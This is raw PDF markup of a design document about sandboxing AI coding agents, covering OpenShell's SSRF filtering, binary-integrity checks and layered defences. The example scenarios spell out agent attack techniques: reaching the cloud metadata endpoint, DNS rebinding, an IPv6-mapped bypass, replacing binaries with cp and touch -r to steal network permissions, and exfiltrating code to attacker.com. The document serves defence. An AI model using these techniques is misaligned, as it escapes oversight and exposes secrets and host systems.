+(Example Scenarios) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 629 Tm
+(Scenario 1: Agent tries AWS metadata service) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 604 Tm
+(Agent: CONNECT 169.254.169.254:80) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 592 Tm
+(Proxy: OPA check ? even if allowed by policy...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 580 Tm
+(Proxy: IP check ? 169.254.169.254 is Tier 1 \(link-local\) ? ALWAYS DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 560 Tm
+(No policy configuration can override this. The AWS/GCP metadata endpoint is permanently) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 545 Tm
+(blocked.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 520 Tm
+(Scenario 2: DNS rebinding attack) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 495 Tm
+(Attacker controls DNS for legit-looking.com:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 483 Tm
+(  First query:  legit-looking.com ? 93.184.216.34 \(public\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 471 Tm
+(  Second query: legit-looking.com ? 10.0.0.1 \(internal etcd\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 447 Tm
+(Agent: CONNECT legit-looking.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 435 Tm
+(Proxy: OPA check ? allowed host ? ALLOW \(L4\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 423 Tm
+(Proxy: DNS resolve ? [10.0.0.1]  \(attacker's rebind\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 411 Tm
+(Proxy: IP check ? 10.0.0.1 is Tier 2 \(RFC 1918 private\) ? DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(Even if the DNS rebinding succeeds, the IP check catches it.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 366 Tm
+(Scenario 3: Agent tries to reach Kubernetes API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 341 Tm
+(Agent: CONNECT 10.43.0.1:6443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 329 Tm
+(Proxy: IP check ? port 6443 is Tier 3 \(control plane\) ? ALWAYS DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 309 Tm
+(Control plane ports are blocked regardless of IP address ? even on public IPs. This) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 294 Tm
+(prevents attacks where the K8s API is exposed on a public IP.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 269 Tm
+(Scenario 4: IPv4-mapped IPv6 bypass attempt) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 244 Tm
+(Agent: CONNECT [::ffff:169.254.169.254]:80) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 232 Tm
+(Proxy: Unwrap IPv4-mapped IPv6 ? 169.254.169.254) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 220 Tm
+(Proxy: IP check ? Tier 1 \(link-local\) ? DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 200 Tm
+(The proxy unwraps IPv4-mapped IPv6 addresses before checking, preventing this common) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 185 Tm
+(bypass technique.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 160 Tm
+(Why This Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 137 Tm
+(OpenShell runs inside a Docker container with a full K3s Kubernetes cluster. The) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 122 Tm
+(internal network contains:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 97 Tm
+(- etcd \(port 2379\): stores all Kubernetes state including secrets) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 13 of 19) Tj
+ET
+endstream
+endobj
+17 0 obj
+<< /Length 3707 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 726 Tm
+(- Kubernetes API \(port 6443\): full cluster control) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 705 Tm
+(- kubelet \(port 10250\): node-level container management) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 684 Tm
+(- Other sandbox pods: potential lateral movement targets) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 663 Tm
+(A successful SSRF attack could give an AI agent access to Kubernetes secrets \(including) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 648 Tm
+(other sandbox credentials\), the ability to create new pods \(sandbox escape\), or access) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 633 Tm
+(to the host network. The three-tier filtering with DNS resolution timing makes these) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 618 Tm
+(attacks extremely difficult.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 587 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 569 Tm
+(5. Binary Integrity \(SHA256 TOFU\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 541 Tm
+(The Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 518 Tm
+(Per-binary network policy \(Section 3\) relies on identifying which binary made a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 503 Tm
+(connection via /proc/{pid}/exe. But what if an attacker replaces the binary?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 478 Tm
+(# Inside sandbox, if agent has write access:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 466 Tm
+(cp /usr/bin/python3 /usr/bin/git    # Replace git with python) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 454 Tm
+(# Now python runs as "git" and gets git's network permissions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 434 Tm
+(Or more subtly, a supply chain attack could replace a binary between sandbox creation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 419 Tm
+(and use ? the binary path is the same, but the code is different.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 394 Tm
+(Key Concept: Trust On First Use \(TOFU\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 371 Tm
+(TOFU is a security model where the first time you encounter an identity, you record it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 356 Tm
+(as the trusted baseline. Every subsequent encounter is verified against that baseline.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 341 Tm
+(SSH uses this model ? the first time you connect to a server, you accept its host key.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 326 Tm
+(If the key changes later, you get a warning.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 301 Tm
+(OpenShell applies TOFU to binary integrity:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 276 Tm
+(First connection from /usr/bin/git:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 264 Tm
+(  1. Compute SHA256\(/usr/bin/git\) ? "a1b2c3d4...") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 252 Tm
+(  2. Record fingerprint: size=2847616, mtime=1709654400, ctime=1709654400,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 240 Tm
+(     dev=0x0803, ino=1234567) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 228 Tm
+(  3. Store in cache: {"/usr/bin/git": {hash: "a1b2c3d4...", fingerprint: ...}}) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 216 Tm
+(  4. Allow connection \(first use = trusted\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 192 Tm
+(Second connection from /usr/bin/git:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 180 Tm
+(  1. Read metadata: size, mtime, ctime, dev, ino) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 168 Tm
+(  2. Compare with cached fingerprint) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 156 Tm
+(  3a. If fingerprint matches exactly ? return cached hash \(no rehash needed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 144 Tm
+(  3b. If fingerprint changed ? recompute SHA256) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 132 Tm
+(  4a. If hash matches ? OK \(file was touched but content unchanged\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 120 Tm
+(  4b. If hash differs ? DENY: "Binary integrity violation: /usr/bin/git) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 108 Tm
+(      hash changed \(cached: a1b2c3d4, current: e5f6g7h8\)") Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 14 of 19) Tj
+ET
+endstream
+endobj
+18 0 obj
+<< /Length 3562 >>
+stream
+BT
+/F2 13 Tf
+1 0 0 1 54 732 Tm
+(Key Concept: File Fingerprinting) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(The fingerprint includes six fields from filesystem metadata:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 684 Tm
+(| Field | Why It's Checked | |-------|-----------------| | size | Different binary =) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 669 Tm
+(different size \(usually\) | | mtime seconds + nanoseconds | Detects normal file) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 654 Tm
+(modifications | | ctime seconds + nanoseconds | Detects metadata changes \(inode,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 639 Tm
+(permissions\) ? cannot be faked by setting mtime | | device ID | Detects if file moved to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 624 Tm
+(different filesystem | | inode number | Detects if file was deleted and recreated \(new) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 609 Tm
+(inode\) even with same name/mtime/size |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 584 Tm
+(The combination of ctime + inode is particularly important: an attacker who replaces a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 569 Tm
+(binary and restores the original mtime \(touch -t\) will still have a different ctime) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 554 Tm
+(\(changed by the kernel on inode modification\) and likely a different inode \(new file =) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 539 Tm
+(new inode\). Both are impossible to fake from userspace without root access to the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 524 Tm
+(filesystem.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 499 Tm
+(Performance optimization: If all six fingerprint fields match exactly, the proxy returns) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 484 Tm
+(the cached hash without rehashing the file. SHA256 on a large binary can take) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 469 Tm
+(milliseconds ? the fingerprint check avoids this on every connection.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 444 Tm
+(Example Scenarios) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 421 Tm
+(Scenario 1: Attacker replaces git binary) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 396 Tm
+(1. First use of /usr/bin/git \(legitimate\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 384 Tm
+(   SHA256 = a1b2c3d4..., cached) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 360 Tm
+(2. Attacker: cp /usr/bin/python3 /usr/bin/git) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 336 Tm
+(3. Second use of /usr/bin/git:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 324 Tm
+(   Fingerprint check: size changed \(python3 is larger\) ? rehash) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 312 Tm
+(   SHA256 = e5f6g7h8... \(python3's hash\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 300 Tm
+(   Hash mismatch: a1b2c3d4 ? e5f6g7h8) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 288 Tm
+(   ? DENY: "Binary integrity violation") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 268 Tm
+(Scenario 2: Attacker creates trojan with matching mtime) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 243 Tm
+(1. Attacker: cp trojan /usr/bin/git && touch -r /usr/bin/git.bak /usr/bin/git) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 219 Tm
+(2. Fingerprint check:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 207 Tm
+(   mtime: matches \(attacker restored it\) ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 195 Tm
+(   ctime: changed \(kernel updated it on write\) ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 183 Tm
+(   ? rehash ? hash mismatch ? DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 163 Tm
+(Scenario 3: Agent updates a package legitimately) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 138 Tm
+(1. npm install ? replaces /usr/lib/node_modules/package/index.js) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 114 Tm
+(2. Next connection from node loading this module:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 102 Tm
+(   Fingerprint: all fields changed \(new file\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 90 Tm
+(   Rehash: new hash computed) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 15 of 19) Tj
+ET
+endstream
+endobj
+19 0 obj
+<< /Length 4102 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(   Cache: no previous entry for this specific path) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(   ? First use ? ALLOW \(new TOFU baseline\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 700 Tm
+(TOFU trusts the binary the first time it's seen. It only blocks changes to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 685 Tm
+(previously-seen binaries. This means the "window of first use" is trusted ? if a binary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 670 Tm
+(is already compromised when the sandbox starts, TOFU won't catch it. This is a known) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 655 Tm
+(trade-off of the TOFU model.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 630 Tm
+(Why This Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 607 Tm
+(Binary integrity checking closes the gap between "what binary does policy say is) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 592 Tm
+(allowed" and "is this actually the same binary." Without it, per-binary network policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 577 Tm
+(can be bypassed by replacing binaries. TOFU provides a practical \(if imperfect\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 562 Tm
+(integrity guarantee without requiring a pre-computed allowlist of binary hashes ? which) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 547 Tm
+(would be impractical for dynamic environments where packages are installed during) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 532 Tm
+(sandbox runtime.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 501 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 483 Tm
+(6. Cross-Platform Support) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 455 Tm
+(The Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 432 Tm
+(Guardian Shell requires a Linux kernel with BPF support \(CONFIG_BPF=y,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 417 Tm
+(CONFIG_BPF_SYSCALL=y, Linux 5.13+ for Landlock\). This means it cannot run on macOS or) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 402 Tm
+(Windows, where most developers work daily.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 377 Tm
+(AI coding agents are used on developer workstations ? and most developers use macOS. A) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 362 Tm
+(Linux-only security tool excludes the majority of the target audience.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 337 Tm
+(Key Concept: Container-Based Abstraction) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 314 Tm
+(OpenShell uses Docker as its platform abstraction layer. The entire system ? including) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 299 Tm
+(the Linux kernel security features \(Landlock, seccomp, network namespaces\) ? runs inside) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 284 Tm
+(a Docker container.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 259 Tm
+(???????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 247 Tm
+(?  macOS / Windows / Linux Host                               ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 235 Tm
+(?                                                             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 223 Tm
+(?  ?????????????????????????????????????????????????????????? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 211 Tm
+(?  ?  Docker Desktop \(runs a Linux VM on macOS/Windows\)     ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 199 Tm
+(?  ?                                                        ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 187 Tm
+(?  ?  ????????????????????????????????????????????????????  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 175 Tm
+(?  ?  ?  OpenShell Container \(Linux\)                     ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 163 Tm
+(?  ?  ?                                                  ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 151 Tm
+(?  ?  ?  K3s Kubernetes + Gateway + Sandbox Pods         ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 139 Tm
+(?  ?  ?  ??????????????????????????????????              ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 127 Tm
+(?  ?  ?  ?  Sandbox Pod                   ?              ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 115 Tm
+(?  ?  ?  ?  Landlock ?  seccomp ?         ?              ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 103 Tm
+(?  ?  ?  ?  netns ?     proxy ?           ?              ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 91 Tm
+(?  ?  ?  ??????????????????????????????????              ?  ? ?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 16 of 19) Tj
+ET
+endstream
+endobj
+20 0 obj
+<< /Length 3503 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(?  ?  ????????????????????????????????????????????????????  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(?  ?????????????????????????????????????????????????????????? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(???????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 688 Tm
+(On macOS and Windows, Docker Desktop runs a lightweight Linux VM. Inside that VM, the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 673 Tm
+(full Linux kernel is available ? including Landlock, seccomp, and network namespaces.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 658 Tm
+(The developer interacts with OpenShell through the CLI, SSH tunnels, or the TUI ? all of) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 643 Tm
+(which work cross-platform.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 618 Tm
+(Supported Platforms) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 595 Tm
+(| Platform | Architecture | How Kernel Features Work |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 580 Tm
+(|----------|-------------|--------------------------| | Linux \(native\) | x86_64, aarch64) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 565 Tm
+(| Directly on host kernel | | macOS \(Docker Desktop\) | Apple Silicon \(arm64\) | Linux VM) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(inside Docker Desktop | | Windows \(WSL2 + Docker Desktop\) | x86_64 | WSL2 Linux kernel +) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 535 Tm
+(Docker |) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 510 Tm
+(Trade-offs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 487 Tm
+(Advantages of the container approach:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 462 Tm
+(- Works on macOS and Windows where most developers are) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 441 Tm
+(- Consistent security guarantees across platforms \(same Linux kernel in container\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 420 Tm
+(- Easy deployment \(docker run is the only prerequisite\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 399 Tm
+(- Multi-architecture container images \(amd64 + arm64\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 378 Tm
+(- Remote access via SSH tunnels ? sandbox can run on a remote server while) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 357 Tm
+(developer works locally) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(Disadvantages:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 307 Tm
+(- Heavy: Docker + K3s + etcd + container runtime per sandbox) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 286 Tm
+(- Startup time: seconds vs milliseconds for process-level isolation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 265 Tm
+(- Resource overhead: each sandbox is a Kubernetes pod with its own filesystem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 244 Tm
+(- Docker Desktop on macOS/Windows adds another layer of indirection \(VM\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 223 Tm
+(- Developer must have Docker installed and running) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 202 Tm
+(- Nested virtualization on some cloud providers can be problematic) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 181 Tm
+(How Guardian Shell's Approach Differs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 158 Tm
+(Guardian Shell:                    OpenShell:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 146 Tm
+(????????????????                  ????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 134 Tm
+(? Linux Host   ?                  ? Any OS with Docker               ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 122 Tm
+(?              ?                  ?  ??????????????????????????????? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 110 Tm
+(?  guardian    ?                  ?  ? Docker Container            ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 98 Tm
+(?  \(daemon\)    ?                  ?  ?  ?????????????????????????  ? ?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 17 of 19) Tj
+ET
+endstream
+endobj
+21 0 obj
+<< /Length 3861 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(?       ?      ?                  ?  ?  ? K3s + Gateway         ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(?  eBPF hooks  ?                  ?  ?  ?  ???????????????????  ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(?  in kernel   ?                  ?  ?  ?  ? Sandbox Pod     ?  ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(?       ?      ?                  ?  ?  ?  ?  Agent + Proxy  ?  ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(?  Agent       ?                  ?  ?  ?  ???????????????????  ?  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(?  \(process\)   ?                  ?  ?  ?????????????????????????  ? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(????????????????                  ?  ??????????????????????????????? ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(                                  ????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(Layers: 1 \(host\)                  Layers: 3-4 \(host ? Docker ? K3s ? pod\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(Startup: milliseconds             Startup: seconds) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(Overhead: near-zero               Overhead: significant) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(Platform: Linux only              Platform: Linux, macOS, Windows) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 580 Tm
+(Guardian Shell is dramatically more efficient but platform-locked. OpenShell trades) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 565 Tm
+(efficiency for portability. For production server environments \(Linux\), Guardian Shell's) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(approach is superior. For developer workstations \(macOS/Windows\), OpenShell is the only) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 535 Tm
+(option.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 486 Tm
+(7. How These Concepts Work Together) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 458 Tm
+(These six mechanisms form a layered defense where each covers gaps left by others:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 433 Tm
+(Attack: Agent tries to exfiltrate source code to attacker.com) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 409 Tm
+(Layer 1 ? Network namespace) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 397 Tm
+(  Agent cannot reach the internet directly; only the proxy is reachable) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 385 Tm
+(  ? Agent must go through proxy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 361 Tm
+(Layer 2 ? L4 OPA policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 349 Tm
+(  Proxy checks: is attacker.com:443 in any allowed endpoint?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 337 Tm
+(  ? DENY \(attacker.com not in policy\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 313 Tm
+(  What if attacker uses DNS rebinding to resolve to an allowed host?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 289 Tm
+(Layer 3 ? SSRF prevention) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 277 Tm
+(  Proxy resolves DNS, checks all IPs against private ranges) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 265 Tm
+(  ? Catches rebinding to internal IPs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 241 Tm
+(  What if attacker hosts on a legitimate-looking domain that IS in policy?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 217 Tm
+(Layer 4 ? Per-binary policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 205 Tm
+(  Proxy checks: which binary is making this connection?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 193 Tm
+(  ? If it's user-generated python script, DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 181 Tm
+(  ? If it's the agent binary, check L7) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 157 Tm
+(Layer 5 ? L7 inspection) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 145 Tm
+(  Proxy decrypts TLS, reads HTTP request) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 133 Tm
+(  ? POST /upload with file content in body) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 121 Tm
+(  ? Policy only allows GET requests to this host ? DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 97 Tm
+(  What if attacker replaces the agent binary to get its permissions?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 18 of 19) Tj
+ET
+endstream
+endobj
+22 0 obj
+<< /Length 3979 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(Layer 6 ? Binary integrity \(TOFU\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
